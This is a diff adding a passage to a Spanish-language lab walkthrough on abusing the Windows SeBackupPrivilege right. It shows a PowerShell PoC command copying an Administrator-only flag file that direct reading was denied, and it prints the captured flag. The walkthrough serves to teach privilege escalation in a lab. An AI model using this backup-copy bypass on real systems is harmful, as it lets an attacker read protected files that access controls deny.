@@ -430,3 +430,24 @@ Get-SeBackupPrivilege
 ```
 
 <img width="685" height="235" alt="image" src="https://github.com/user-attachments/assets/814d2407-1b91-4611-a4dd-9452562f45b8" />
+
+
+
+Intentamos leer el archivo del laboratorio con el somando:
+```powershell
+cat C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
+```
+
+<img width="982" height="239" alt="image" src="https://github.com/user-attachments/assets/93b36833-df46-49ab-b3c1-5ce8dfd4d698" />
+
+Como era de esperar, tenemos acceso denegado.
+
+Utilizamos la `PoC` para realizar una copia con sintaxis de backup:
+```powershell
+Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
+```
+Una vez copiado el fichero, obtenemos la flag leyendolo:
+<img width="1099" height="383" alt="image" src="https://github.com/user-attachments/assets/e5ab6db4-45b7-47fb-935f-223ea9c36985" />
+
+
+- `Flag`: `Car3ful_w1th_gr0up_m3mberSh1p!`
